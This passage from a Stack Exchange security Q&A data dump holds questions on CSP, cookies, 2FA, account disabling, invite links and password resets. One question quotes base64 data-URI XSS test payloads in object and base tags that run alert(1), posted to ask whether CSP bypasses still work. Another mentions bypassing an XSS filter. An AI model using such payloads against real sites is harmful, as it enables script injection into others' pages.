<p>Our website also has a blog at &quot;example.org/blog&quot;, hosted by a third party.  Our load balancer routes all requests to &quot;/blog&quot; (and subpaths) to our blog host's servers.  We don't <em>distrust</em> them, but we'd prefer if security issues with the blog host can't affect our primary web app.</p>
<p>Here are the security concerns I'm aware of, along with possible solutions.</p>
<ol>
<li>The requests to the blog host will contain our user's cookies.
<ul>
<li>Solution: Have the load balancer strip cookies before forwarding requests to the blog host.</li>
</ul>
</li>
<li>An XSS on the blog allows the attacker to inject JS and read the cookie.
<ul>
<li>Solution: Use &quot;HTTP-only&quot; cookies.</li>
</ul>
</li>
<li>An XSS on the blog allows the attacker to inject JS and make an AJAX request to &quot;example.org&quot; with the user's cookies.  Because of the same origin policy, the browser allows the attacker's JS to read the response.
<ul>
<li>Solution: Have the load balancer add some Content-Security-Policy to the blog responses?  What's the right policy to set?</li>
<li>Solution: Suborigins (<a href=""https://w3c.github.io/webappsec-suborigins/"" rel=""nofollow noreferrer"">link</a>) looks nice, but we can't depend on browser support yet.</li>
</ul>
</li>
</ol>
<p>Is there a way to safely host the blog on the same domain?</p>
","163855","","163855","","2020-08-23 10:33:15","2020-09-22 11:06:20","Serving ""less trusted"" content on the same domain","<content-security-policy><same-origin-policy>","2","2","","","","CC BY-SA 4.0"
"237467","1","237477","","2020-08-23 15:05:57","","1","195","<p>I stumbled upon a web app which is accepting user input and putting it into a variable within <code>script</code> tag.</p>
<p>The <code>script</code> tag does have a <a href=""https://stackoverflow.com/questions/42922784/what-s-the-purpose-of-the-html-nonce-attribute-for-script-and-style-elements"">nonce attribute</a>.</p>
<p><a href=""https://i.stack.imgur.com/sP3IM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sP3IM.png"" alt=""enter image description here"" /></a></p>
<p>As am working on bypassing the XSS filter, I had this thought that this practice of reflecting user input within an inline script with nonce attribute beats the purpose of using it.</p>
<p>Is my understand correct or am I missing something here ?</p>
","196045","","196045","","2020-08-23 16:06:57","2020-08-24 01:51:11","Is nonce useless when user input is reflected within an inline script?","<xss><penetration-test><content-security-policy><nonce>","1","0","","","","CC BY-SA 4.0"
"237469","1","237471","","2020-08-23 16:30:18","","0","169","<h2>Would it be secure to:</h2>
<ol>
<li>Store all my website cookies (stack sites, webhost, github, web-based email, etc) on a remote server (using an customized open-source VPN or something)</li>
<li>Login to the server with password + 2fa (and maybe have a trusted devices list?)</li>
<li>Keep the cookies only on the server... never actually download them to any of my devices</li>
<li>When visiting stackexchange.com, for example, my server would send the cookies to stack exchange, get the response, and send it back to me, but REMOVE any cookies &amp; store them only on my server</li>
</ol>
<h2>Benefits (I think):</h2>
<ol>
<li>I could keep diverse and very strong passwords for every website, but don't store the passwords anywhere digitally (keep them on paper in a safe at home or something)</li>
<li>logging in to all the sites I use on a new device only requires one sign in (to my custom VPN server)</li>
<li>Only cookies would be stored digitally, so if anything went wrong server-side, my passwords would be safe &amp; I could disable all the logins through each site's web-interface</li>
</ol>
<h2>Problems (I think):</h2>
<ol>
<li>If the authentication to my custom VPN is cracked, then every website I've logged into would be accessible</li>
<li>The time &amp; energy &amp; learning required to set something like this up.</li>
</ol>
<h2>Improvement idea:</h2>
<ol>
<li>When I sign in to the server the first time, the server creates an encryption key, encrypts all the cookies with it, and sends the encryption key to me as a cookie. Then on every request, my browser uploads the key, the website's cookie is decrypted, then the request is made to whatever website I'm visiting. Then only one client could be logged in at a time (unless the encryption cookie were stolen)</li>
<li>Encrypt each cookie with a simple password, short password or pin number</li>
<li>An encryption key that updates daily (somehow)</li>
<li>Keep a remote list of trusted devices, identified by IP address? Or maybe by cookie?</li>
</ol>
<h2>Why not just sign into the browser and sync cookies across devices?</h2>
<ul>
<li>Signing into Firefox mobile &amp; Firefox on my computer doesn't give the cookies to Twitter's or Facebook's web-browsers (that frustratingly always open first instead of taking me to my actual browser!)</li>
<li>It's not as cool?</li>
<li>That would require me to trust a third-party (of course, I'll ultimately have to trust my web-host to some extent)</li>
</ul>
","74828","","","","","2020-08-23 22:53:16","Store cookies for multiple sites on remote server and connect from multiple clients","<vpn><cookies><account-security><web-service><remote-server>","2","3","","","","CC BY-SA 4.0"
"237533","1","","","2020-08-25 05:23:15","","2","348","<p>I am at the moment using Bitwarden and a separate 2FA app.</p>
<p>I am trying to figure out a way to be able to securely recover my access to credentials and 2FA in case my phone/laptop/other electronic devices get stolen or destroyed and am not sure if what I am doing is good enough.</p>
<p>The app I am using for 2FA allows for encrypted backups with a password. I use Bitwarden to manage my passwords and it also requires a 2FA code from the app.</p>
<p>Now I have a backup of the 2FA app on Bitwarden, where the master passwords for both are long and different (consisting of letters only). I modified the 2FA recovery code for Bitwarden (so that only I know how to read it) and store it on a piece of paper in my wallet and some other places.</p>
<p>My plan is if all goes wrong to gain access to Bitwarden through the recovery code and then download and restore the backup of the 2FA app, in order to regain access to the other places.</p>
<p>Do you think that is secure enough?</p>
","241681","","","","","2020-08-25 05:23:15","Is storing an encrypted 2FA backup on Bitwarden (a password manager) a good idea?","<password-management><account-security><multi-factor>","0","0","","","","CC BY-SA 4.0"
"237574","1","237576","","2020-08-26 02:07:11","","-6","217","<p>Is it possible that a StackOverflow account can be hacked without the owner knowing?</p>
<p>If a StackOverflow account is hacked, is any other information (like social media passwords) exposed other than StackOverflow information?</p>
","226283","","6253","","2020-08-26 08:19:13","2020-08-26 08:19:13","Is it possible to hack a StackOverflow account?","<account-security>","1","4","","2020-08-26 13:37:22","","CC BY-SA 4.0"
"101363","1","101382","","2015-09-28 20:51:15","","8","792","<p>I have been thinking about how a developer restricted (for whatever reason) to serving an unencrypted site might protect themselves from threats such as overzealous ISPs injecting ads or notifications into their pages, or script kiddies in a coffee shop turning the developer's normally harmless code into an ad hoc attack site. My first thought was the Content Security Policy header, but I am now unsure. </p>

<p>It is my understanding that unencrypted http traffic, including the headers, can be modified by a malicious third party performing a man-in-the-middle attack. </p>

<p>If this is the case, then the Content Security Policy header would be vulnerable to modification or deletion. The attacker could then insert, and have the browser execute, whatever they wanted.</p>

<p>Does it then give the developer a false sense of security in being able to include a CSP on an unencrypted page without some sort of warning in the browser console about MiTM, or are the good reasons for including it enough to outweigh this? </p>
","87886","","87886","","2015-09-28 22:17:09","2018-10-25 08:51:17","Does the Content Security Policy header provide a false sense of security if a page is served over unencrypted HTTP?","<http><man-in-the-middle><content-security-policy>","3","1","","","","CC BY-SA 3.0"
"168807","1","168809","","2017-09-05 03:45:24","","12","6049","<p>I've heard that cookies is less secure than the session.<br>
For example, if a web uses a cookie to detect if an user has logged in or not, people can forge a cookie to simulate a false user because he can read the cookie and forge one easily. Here is a link that I've found: <a href=""https://security.stackexchange.com/questions/93218/session-vs-cookie-authentication"">Session vs Cookie Authentication</a></p>

<p>Now I'm using Tornado with python to build a website. Here is a simple example of the module of login with Tornado: <a href=""https://stackoverflow.com/questions/6514783/tornado-login-examples-tutorials"">https://stackoverflow.com/questions/6514783/tornado-login-examples-tutorials</a>
<br>
To my surprise, there is no session in Tornado. Its doc says that there is the secure cookies but I don't think it is safer than ordinary cookies.<br></p>

<p>ordinary cookie:<br></p>

<pre><code>browser ------- I'm Tom, my password is 123 -------&gt; server
</code></pre>

<p>secure cookie:<br></p>

<pre><code>browser ------ &amp;^*Y()UIH|&gt;Guho976879 --------&gt; server
</code></pre>

<p>I'm thinking that if I could get <code>&amp;^*Y()UIH|&gt;Guho976879</code>, I can still forge the cookie, right?<br></p>

<p>If I'm correct, why doesn't Tornado have the session? Or is there some way that can make the secure cookie is the same secure as the session? Maybe that I erase the cookies when the browser is closed can be safer?</p>
","155246","","155246","","2017-09-05 04:20:15","2017-09-05 14:20:36","Why doesn't Tornado have session","<cookies><session-management><account-security><websites>","3","2","","","","CC BY-SA 3.0"
"168813","1","","","2017-09-05 05:50:48","","1","711","<p>In my modsecurity auditlog there is a binary file logged as text:
<a href=""https://i.stack.imgur.com/MSyht.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/MSyht.jpg"" alt=""enter image description here""></a></p>

<p>How can I prevent modsecurity from bloating my logfiles with the content of binary files like that?</p>
","158304","","","","","2023-07-21 08:03:15","How can I prevent modsecurity from logging binary data","<apache><logging><mod-security>","1","2","","","","CC BY-SA 3.0"
"237751","1","","","2020-08-30 17:59:01","","1","182","<p>Recently I registered iCloud account with my gmail account. Now I received fake email from &quot;iCloud&quot; on mail.com email address which I use frequently for registering accounts on various sites. <strong>This email address is also recovery address for the gmail account.</strong></p>
<p>Here's the fake email:</p>
<p><a href=""https://i.stack.imgur.com/zBTuA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/zBTuA.png"" alt=""fake icloud email"" /></a></p>
<p>Also, something similar happened when I transferred money from paypal to my bank account. Couple days after transferring money, I received fake PayPal email with link (phishing I guess) telling me my paypal acc is limited and I wont be able to send or receive money. That email came to my mail.com account, which I also use for paypal account.</p>
","241969","","","","","2020-08-31 16:33:51","Is my email, pc or something else hacked?","<passwords><malware><account-security><phishing>","2","0","","","","CC BY-SA 4.0"
"237779","1","","","2020-08-31 10:03:51","","2","385","<p>I'm creating this admin dashboard, and I have a question wich I have been stuck on for a while now.
And I'm starting to question what kind of data the admin should be able edit/view on the other registered users.</p>
<p>Should the <strong>admin users</strong> be able to:</p>
<ul>
<li>Change the users password?</li>
<li>Send password-reset email to the user?</li>
<li>Change account information on the user (firstname, lastname, email)?</li>
</ul>
<p>Just to mention this: the users have the possibility to click on <a href=""http://#"" rel=""nofollow noreferrer"">forgot password</a> on the login screen to request the password request themselves. They also have the ability to change the account information themselves. Should I still implement some of this functionality on the admin side? Upsides / downsides to this?</p>
","242001","","","","","2023-10-06 15:08:35","Admin change user details / account information in admin interface","<passwords><web-application><account-security>","3","2","","","","CC BY-SA 4.0"
"168946","1","168956","","2017-09-07 04:56:59","","0","534","<p>I would like to understand much about Microsoft Security Essentials or another antivirus which build in or developed by Microsoft. I'm planning to set up the network for my company and use Microsoft Plattform for operating that structures But I don't understand much about Antivirus or another Security which can help to protect my network from attacker or viruses. </p>

<p>My network structures:</p>

<ul>
<li><p>Based on Microsoft platform</p></li>
<li><p>Network type: <strong>WAN</strong> (there are multiple LAN there)</p></li>
<li><p>Use Mikrotik (configured Mikrotik firewall and another policy,VPN)</p></li>
<li><p>Use Window server 2016 for Files Sharing (active directory, DNS, allow remote, Files storage for sharing,)</p></li>
<li><p>We provided DHCP for our client</p></li>
</ul>

<p>Due to Window server 2016 some of the network developers have recommended me to use Keperstkey, symatic,.... But I don't understand why they don't recommend me to use Microsoft Security Essentials or Microsoft Defender because that antiviruse was built from Microsoft.</p>

<p>Please give me some idea.</p>

<p>Thanks</p>
","74850","","74850","","2017-09-07 05:06:15","2017-09-08 07:18:45","Should we use Microsoft security or defender for securing our WAN network","<network><antivirus><network-scanners><security-theater><microsoft>","3","1","","2017-09-07 19:40:12","","CC BY-SA 3.0"
"237896","1","","","2020-09-03 09:49:17","","2","333","<p>We have an automated system to disable user accounts that have seen no logins for 90 days. We also have a process of re-enabling such accounts (at the behest of the affected users), and this process involves contacting our customer support.</p>
<p>Alas, too frequently such re-enabled accounts are not actually logged into during the following 24 hours, and so they revert to their disabled state. Thus restarts another iteration of customer support contact.</p>
<p>I can find no documentation about the use case of re-enabling users. <strong>How long a &quot;grace period&quot; may we give users to log into a freshly-re-enabled user account?</strong></p>
<p>Edit: The PCI documentation states (v3.2, p.69):</p>
<blockquote>
<p><strong>PCI DSS Requirement</strong><br />
8.1.4 Remove/disable inactive user accounts within 90 days.</p>
<p><strong>Testing Procedures</strong><br />
8.1.4 Observe user accounts to verify that any inactive accounts over 90 days old are either removed or disabled.</p>
<p><strong>Guidance</strong><br />
Accounts that are not used regularly are often targets of attack since it is less likely that any changes (such as a changed password) will be noticed. As such, these accounts may be more easily exploited and used to access cardholder data.</p>
</blockquote>
<p>So the PCI-DSS document does not touch upon the topic of enabling disabled or blocked users.</p>
<p>One option would be to modify the &quot;last login&quot; date by postponing it a few days, as this would similarly postpone the next &quot;harvest time&quot; by the account-disabling task ... but I feel this is tampering with user data (and might show a normal user having logged in on a Sunday). A better, but more complex, solution would be to keep separate track of &quot;last re-enabled&quot;, but even for that I would love to have some hard rule to code against.</p>
<p>Alternatively, it should be possible to disable user accounts already after, say, 70 days -- this possible inconvenience yields a 20-day window to sort out re-enabling AND first subsequent login without violating the 90-day rule.</p>
","70109","","70109","","2020-09-03 13:38:11","2020-09-03 13:38:11","Grace period for users after re-enabling account disabled by PCI-DSS 8.1.4?","<pci-dss><account-security><user-management>","0","0","","","","CC BY-SA 4.0"
"237936","1","","","2020-09-04 06:00:59","","0","78","<p>We have a site builder, allows users to add/modify JS/HTML/CSS. Is it possible to provide a global authentication for it?</p>
<p>I mean users login once but can interact with all sites as their own names. Those sites should not be able to steal user token and change data in other sites in the network. Consider a global authentication for all stackoverflow sites and no XSS protection.</p>
<p>Architecture:</p>
<ol>
<li>An HTTP only cookie (instead of JWT local storage) for our API authentication</li>
<li>Limit each site requests to its own resources by a dynamic CORS.</li>
</ol>
<p>Is this secure?</p>
","242181","","","","","2020-09-04 06:00:59","Secure authentication for sites which allow user to modify js/html","<authentication><xss><account-security><cors><multi-tenancy>","0","3","0","","","CC BY-SA 4.0"
"237963","1","","","2020-09-04 17:43:50","","0","1746","<p>I am doing online school at the moment and I am wondering if my school tracks and looks at everything I search just through my school Gmail account. I am on my own network and pc which has never been connected to the school network in any way except through the school Gmail account.</p>
","242235","","6253","","2020-09-04 19:22:16","2020-09-04 19:22:16","Can my school look at my search history through Google Chrome if I am logged in through my school account?","<account-security><google><gmail>","1","1","","2020-09-04 19:20:37","","CC BY-SA 4.0"
"29474","1","29477","","2013-01-21 23:22:30","","0","551","<p>I have a desire to make my own <em>CMS</em> , to improve my programming skills. I would use <em>PHP</em> as a server side programming language. </p>

<p>So my question is, on what <code>security issues</code> I must pay attention when programming ? </p>

<p>I am familiar with <strong>SQL injection</strong> and I'd use <strong>PHP prepared statements</strong> to resolve this.</p>

<p>Must I pay attention to any other dangerous/familiar issue ?</p>
","19775","","86652","","2016-06-25 09:40:17","2016-06-25 09:40:17","CMS security issues","<php><security-theater><secure-coding>","2","0","","","","CC BY-SA 3.0"
"169099","1","","","2017-09-08 20:04:10","","-2","186","<p>I ask this question in light of the recent Equifax hacking. I'm sure people in China get hacked all the time, but I was recently talking to someone from there and they told me they never walk around with a wallet. Everything is on their phone, including all of their credit cards and payment methods. And this person is a computer programmer.  Personally, I would be very wary of putting my credit cards on my phone to use on demand.</p>

<p>So I guess my question is why does this person feel so safe using that as their primary means of payment? Is it because their internet is not as open and free flowing as ours, in the US is?</p>
","104011","","","","","2018-09-22 03:13:13","How do the Chinese keep information secure?","<privacy><credit-card><account-security>","1","1","","2017-09-11 06:30:47","","CC BY-SA 3.0"
"238162","1","238202","","2020-09-10 16:13:44","","0","719","<p>I am wondering if it's safe to send the signup, reset password, 6 digit verification code in the subject of the email.</p>
<p>Example: &quot;Welcome to the Application, Your verification code is XXXXXX&quot;</p>
<p>The purpose of sending the verification code in the subject is to make it easily accessible on mobile devices. Instead of opening the email, a user can simply see the code from the notification.</p>
<p>But with that, the verification code can be shown in the list of the emails. What are some other security risks here?</p>
<p>Real-life attack scenario:
I am on a screen share call with my Boss, I know he intentionally enabled email push notifications on Desktop. I know the service he is using exposes the password reset verification code in the subject of the email. I try to reset there password via email. They receive a notification showing the 6 digit code. I quickly do what's currently going on your mind and 💥</p>
","242513","","242513","","2020-09-11 08:43:25","2020-09-11 13:36:46","Is it safe to send verification code in the subject of the email?","<email><account-security><multi-factor>","1","1","","","","CC BY-SA 4.0"
"238195","1","","","2020-09-11 08:30:54","","0","52","<p>Suppose I need to store a bunch of passwords: storing them in a <em>txt</em> or <em>odt</em> file inside an encrypted container, such as the ones produced by VeraCrypt, is bad practice? Would I put myself at risk?</p>
<p>If so what are my other free options? (So no password managers) Do I need to also hash my passwords before storing them in the encrypted container? Would a physical copy of the list be more secure? Or is there some other option that I didn't consider? (Of course the option of just remembering them is not implementable)</p>
","242524","","","","","2020-09-11 13:30:49","Is storing passwords in encrypted container still bad practice?","<encryption><passwords><password-management><account-security><veracrypt>","0","2","","2020-09-11 13:34:01","","CC BY-SA 4.0"
"238313","1","","","2020-09-15 04:21:33","","0","167","<p>I've done some research and it looks like that the way linux keeps history is less about security and audit and more about helping the user.</p>
<p>Even after making changes to instantly log the command and space commands the command still wont log till finished.</p>
<p>Is there any way to improve audit logging other then possibly writing a module for the linux kernel that will instantly log whatever is typed?</p>
","31084","","94201","","2020-09-15 08:47:12","2020-09-15 09:53:15","Logging SSH commands on Linux - is custom kernel the only way?","<linux><account-security><audit><logging><kernel>","2","0","","","","CC BY-SA 4.0"
"238343","1","","","2020-09-15 18:14:30","","2","331","<p>I'm having trouble making sense of some reported CSP violations that don't seem to actually be violations <a href=""https://w3c.github.io/webappsec-csp/"" rel=""nofollow noreferrer"">according to the CSP standard</a>.  I have not managed to reproduce the violations in my own browser, and based on my own testing I believe that the block is the result of a non-compliant browser.  That seems like a bold assertion, but based on all the documentation I've read and my tests it's the only thing that makes sense.</p>
<p>Here is (more or less) what the CSP is:</p>
<pre><code>frame-ancestors [list-of-urls]; default-src https: data: blob: 'unsafe-inline' 'unsafe-eval' [list-of-more-urls]; report-uri [my-reporting-endpoint]
</code></pre>
<p>The problem is that I'm getting some violations sent to my reporting endpoint.  Here is an example violation report:</p>
<pre><code>{&quot;csp-report&quot;:{
    &quot;document-uri&quot;:&quot;[REDACTED]&quot;,
    &quot;referrer&quot;:&quot;[REDACTED]&quot;,
    &quot;violated-directive&quot;:&quot;script-src-elem&quot;,
    &quot;effective-directive&quot;:&quot;script-src-elem&quot;,
    &quot;original-policy&quot;:&quot;[SEE ABOVE]&quot;,
    &quot;disposition&quot;:&quot;enforce&quot;,
    &quot;blocked-uri&quot;:&quot;https://example.com/example.js&quot;,
    &quot;status-code&quot;:0,
    &quot;script-sample&quot;:&quot;&quot;
}}
</code></pre>
<p>The context would be that the page in question had a <code>&lt;script src=&quot;https://example.com/example.js&quot;&gt;&lt;/script&gt;</code> on it somewhere.</p>
<p>To be clear, <code>https://example.com</code> is not in the list of allowed URLs under <code>default-src</code>.  However, that shouldn't really matter.  Here are all the relevant facts that lead me to believe this is being caused by a non-compliant browser that someone is using:</p>
<ol>
<li>There is no <code>script-src-elem</code> defined so it should fall back on the <code>default-src</code> for the list of allowed URLs.</li>
<li><code>default-src</code> includes the <code>https:</code> schema, which means that <em>all</em> urls with an <code>https</code> scheme will be allowed.  The blocked URL definitely uses HTTPS</li>
<li><a href=""https://csper.io/docs/sources"" rel=""nofollow noreferrer"">This source</a> agrees that the scheme source (<code>https</code>) will automatically allow any <code>https</code> resources.  Therefore this should be allowed even though <code>example.com</code> is not in the list of allowed URLs.</li>
<li><a href=""https://w3c.github.io/webappsec-csp/#match-url-to-source-expression"" rel=""nofollow noreferrer"">The official CSP docs</a> also agree, showing that scheme matching happens first and can allow a URL even before the list of allowed URLs is checked.</li>
<li>Therefore, if you include the <code>https:</code> scheme in your <code>default-src</code>, your CSP will match <code>&lt;script src=&quot;https://anything.com&quot;&gt;</code> even if not specifically in the list of allowed URLs</li>
<li>In my own testing I found the above to be true.</li>
</ol>
<p>Despite all of this, I have sporadic reports of CSP violations even though it shouldn't.  Note that I'm unable to replicate this exactly because the pages in question have changed, and I don't have easy control over them.  The only thing I can think of is that some of my users have a browser that isn't properly adhering to the CSP standard, and are rejecting the URL since it is not on the list of allowed URLs, rather than allowing it based on its scheme.</p>
<p>Is this the best explanation, or am I missing something about my CSP? (and yes, I know that this CSP is not a very strict one).</p>
","149676","","","","","2020-09-15 18:14:30","Understanding CSP: report shows blocked <script> that shouldn't have been blocked","<content-security-policy>","0","0","","","","CC BY-SA 4.0"
"238407","1","","","2020-09-17 03:07:10","","0","128","<p>I recently went on to the Dr Squatch website to buy some soap that I've been seeing in all of those Youtube video ads.  What happened really freaked me out.</p>
<p>The website asked for my email, and I provided my outlook account. Immediately, my cell phone buzzed with the text message sound and the website asked me for a six digit code that was texted to me. As soon as I put the code in, my address and credit card information appeared on the screen.</p>
<p>The phone number I had provided to outlook as a recovery option. I am dismayed that they would give it out to a third party like that. However, the credit card and address I never gave to outlook, so how could they have gotten it? Do they isntall spyware on people's computers?</p>
","172175","","","","","2020-09-17 03:07:10","how did they get my credit card","<account-security>","0","4","","","","CC BY-SA 4.0"
"238422","1","","","2020-09-17 09:24:11","","1","886","<p>I'm assessing the security level of a webapp and one of the test cases is the CSP header. I always use the <a href=""https://csp-evaluator.withgoogle.com/"" rel=""nofollow noreferrer"">Google CSP evaluator</a> to assess the header. Let's consider the following CSP header:</p>
<pre><code>Content-Security-Policy:
img-src 'self' https://example.com data: www.google-analytics.com;  
object-src 'self' https://example.com data:; 
script-src 'self' https://example.com www.google-analytics.com;
</code></pre>
<p>The evaluator states that there are two high severity findings; one for allowing the data attribute for an object element; other one for missing the base-uri directive. So I thought: &quot;Hey, that's great, then maybe we can still exploit XSS by bypassing the CSP.&quot;</p>
<p>However, in my local webserver set-up with the CSP header above, the CSP policy still triggers a violation when injecting object elements with a data attribute or a base element. I'm rendering a page which echoes the user input from a query string right into the page unescaped.</p>
<p>I've read some articles about people succeeding in bypassing CSP with object elements and base-uri's like these:</p>
<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;
&lt;base href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot; /&gt;
</code></pre>
<p>Result:</p>
<pre><code>Content Security Policy: The page’s settings blocked the loading of a resource at inline (“script-src”).
</code></pre>
<p>The CSP policy blocks these payloads as it states that inline scripts are not allowed. Even with a barebone CSP like <code>default-src 'self'</code> the violation still triggers.</p>
<ol>
<li>Has something changed over time or am I just doing it wrong?</li>
<li>Are data attributes URI's etc. always seen as inline scripts?</li>
<li>How 'high' are these findings then? Only setting 'unsafe-inline' will make the bypasses work, but that completely makes the bypass useless, because then you can inject script tags whatsoever.</li>
</ol>
","219620","","6253","","2020-09-17 09:32:02","2020-09-17 09:32:02","Do object-src and base-uri bypasses still work on Content-Security-Policies?","<xss><content-security-policy><header>","0","0","","","","CC BY-SA 4.0"
"238492","1","","","2020-09-18 11:54:55","","0","77","<p>Does it still make sense with multi factor protected accounts to deactivate them after a certain period of inactivity?</p>
<p>I'd say yes because the user himself probably doesn't remember that an account exists when they aren't using it.</p>
<p>In fact we've had several VPN systems before, during the rise, and after Covid was &quot;established&quot;, all of which require cleanup.</p>
<p>I can already feel the &quot;how dare you&quot; look, even though it's proven they never used the old system anymore.</p>
","13835","","","","","2020-10-18 13:05:55","Deactivate MFA protected accounts","<account-security>","1","0","","","","CC BY-SA 4.0"
"238503","1","","","2020-09-18 14:21:09","","2","382","<p>I have started to work on the Forgotten password feature on my website. Based on <a href=""https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"" rel=""nofollow noreferrer"">OWASP Forgot Password cheatsheet</a>, the user should provide enough information to confirm that it is really them.
The system currently is working as follows:</p>
<ol>
<li>The user clicks on <code>forgotten password</code> link on the login screen</li>
<li>The user fills in a form to confirm their identity (user must enter their username, their email address which is associated with the account, and if the 2FA is enabled for authentication, the user must provide their 2FA token as well)</li>
<li>After filling in form the website says &quot;if all data is matching, the email with reset link will soon be on your way.&quot; After which the website checks if all data is correct, and if it is, it sends the link with password reset to the given email. (if the 2FA is not set, the TOTP field is ignored)</li>
<li>The user opens the link from the email, provides their new password, with confirmation.</li>
<li>The password is changed, all current sessions are terminated, user is redirected to login screen, an email is sent to all email addresses linked to the account that the password has been changed.</li>
</ol>
<p>In the cheatsheet however it appears that when using URL token for password reset, the user should be asked some questions in order to reset their password.
I am wondering if I am introducing some vulnaribility by asking people for TOTP when resetting password. Additionally I am wondering if the process I have outlined is secure.</p>
<hr />
<p>Some more information about the TOTP:</p>
<ul>
<li>The TOTP is asked regardless if it is set up or not: the field is optional</li>
<li>The TOTP on the website is generated only using Authenticator application such as <a href=""https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en_GB"" rel=""nofollow noreferrer"">Google Authenticator</a>, there is no ability to send it via SMS, and the code is not being sent via notification.</li>
<li>The TOTP can not be removed without user login as well as it <em>currently</em> cannot be removed by administrator.</li>
</ul>
<p>I have been googling for the answer for this question but most of the answers either talk about how to securely remove TOTP, or why using TOTP for generating password reset URL to reduce the length is bad. Neither of those however answer my question.</p>
","102283","","102283","","2020-10-08 22:21:33","2020-10-08 22:21:33","In forgotten password is asking user their TOTP among other details secure?","<account-security><one-time-password><password-reset>","0","0","","","","CC BY-SA 4.0"
"169657","1","169659","","2017-09-18 06:22:17","","5","272","<p>When using a passphrase, and someone shows concern about it being cracked in a short number of years due to significant advances in technology or whatnot, often you'll hear the advice ""Just add a word or two"".</p>

<p>They mean to your existing passphrase, right? Or do they mean create a new passphrase with N+1 or N+2 words this time?</p>
","122173","","","","","2017-09-18 16:04:13","""Just add a word or two"" advice","<account-security><passphrase>","1","2","","","","CC BY-SA 3.0"
"30061","1","30088","","2013-02-01 07:52:46","","14","971","<p>I need to make a real motivation for a security talk to a board of management.</p>

<p>I know that in case a company ships products ignoring (so knowing and on purpose not caring) then it is held liable. What I heard as well is that the CEO is the one made accountable.</p>

<p>Now, I am wondering if anyone had read or is aware of a real life example?</p>
","20259","","31854","","2013-11-03 05:27:09","2013-11-03 05:27:09","Are you aware of any CEO that went to jail because of Security Flaws?","<security-theater>","2","2","","","","CC BY-SA 3.0"
"238707","1","","","2020-09-23 14:09:15","","5","595","<p>I'm having a debate with a coworker right now about how to design an invitation system.  The idea is that the mobile app will be able to send an invitation link to, say, a Whatsapp group, and people from that group will be able to use the link to join our system and be automatically enrolled into a group on our system.  The coworker suggests the link format be along the lines of:</p>
<pre><code>https://www.ourdomain.com/Register?groupId=12345
</code></pre>
<p>I said that this was insecure because someone could just change the group ID and register with our system (which is marketed as, amongst other things, 'secure'), having the system join them into any group they can guess the ID for.  This system is going to be used by medical professionals.  I suggested that the &quot;group ID&quot; should be encrypted, and he responded that there's no point because someone could just reverse engineer the app and generate their own encrypted group ID anyway.</p>
<p>I then suggested using a server-generated ID for the invitation ID, and storing the group ID in which to enrol the user upon registration in the server's database, to which he responded that that too could be hacked, and that it would just be harder.</p>
<p>What's the best practice for this sort of &quot;invite link&quot; in terms of security?  It seems to me that the coworker has a very blase attitude towards things, and that whilst technically the system could be hacked, it's still worth making it harder to hack.</p>
","243135","","","","","2020-09-23 17:54:28","Protecting an invitation to join the system","<encryption><account-security>","2","7","","","","CC BY-SA 4.0"
"169786","1","169798","","2017-09-19 17:55:25","","1","315","<p>I noticed some activity on my phone via myactivity.google.com that has been occurring recently at 3 AM which I am very suspicious of.  While I am frequently up at that hour I know it's happening when I'm not up.  Details:</p>

<ul>
<li>Started a week or two ago</li>
<li>Always occurs at exactly 3 AM</li>
<li>It may coincide with new/updated apps and or permission changes but I'm not sure</li>
<li>No visible changes to the phone during that time, eg. screen doesn't turn on, indicator lights look normal</li>
</ul>

<p>Am I being paranoid?  </p>

<p>The 2nd part of this question is, presuming this activity is does not appear normal what would be the best approach to acquire more information about what is going on? I'm right at home on with a traditional web/app server, but not sure where to look in Android.  Device is an un-rooted Verizon Note 4</p>

<p><a href=""https://i.stack.imgur.com/Ax4kx.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Ax4kx.png"" alt=""Activity detail 1""></a></p>

<p><a href=""https://i.stack.imgur.com/eNA1A.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eNA1A.png"" alt=""Activity detail 2""></a></p>
","43939","","","","","2017-09-19 20:58:36","Does this Google Android Note4 activity look legit?","<android><google><account-security>","1","4","","2017-09-19 22:25:45","","CC BY-SA 3.0"
"169803","1","","","2017-09-19 21:50:08","","0","209","<p>I am envisioning a simple REST API for my app only that essentially functions as a proxy server for some organization's API. Thus, no sensitive information is stored or available through the my API. </p>

<p>Critically, the information must be constantly available and accurate. It does not need to be kept confidential, as it is public information.</p>

<p>Amazon AWS is comparatively cheap for private hosting, but I worry that I am not addressing security concerns because I do not know what such concerns would actually be. </p>

<p>By security, I mean <em>anything</em> that has to do with protecting my server: some sort of firewall, strong password (of course), 2-factor authentication... I do not know what else.</p>

<p>Are there any security issues I should address for this simple REST API without sensitive data on AWS? </p>
","159423","","485","","2017-09-19 22:55:06","2018-01-18 14:53:22","What kind of security is needed for simple REST API on Amazon's AWS","<account-security><api><aws>","2","5","","","","CC BY-SA 3.0"
"169809","1","169878","","2017-09-20 00:20:53","","-5","479","<p>I develop a sort of social network for mobile and desktop browser with a REST API. </p>

<p>I can't ask to users to buy a U2F key or any hardware (but I could propose to support it if they have, since Chrome/Firefox support it natively now). </p>

<p>I don't want to ask a password because the majority of users uses the same password on multiples websites. So it's easy to hack a weak website, that may be store in clear text the password, or hashed but not salted and to use rainbow tables to obtain the password in clear. </p>

<p>I need to prove identity of the user when he lost credentials, but I don't want the classic OTP link by email/sms because this open a vector of attacks (eg: I give 5min my mobile to my wife, she's not an hacker/geek but she easily have the idea to click « I forgot my password », go on Mail/SMS application (iOS/Android don't ask password) and click on the OTP link to reset my password and be connected on my account. )</p>

<p>I don't want to ask on registration some personnal questions/answers, because your wife/family/friends could generaly answer, because it's a privacy leak, and because the user don't always remember the exact words/syntax used.</p>

<p>I search a user-friendly way to resist to theses attacks. ( So please, STOP to tell me to use a scheme exposed to theses attacks! ).</p>

<p>I have a scheme suggestion, most experts here doesn't like to think about new scheme, but all existing schemes I known don't solve theses attacks :(</p>

<p>My question is simple: 
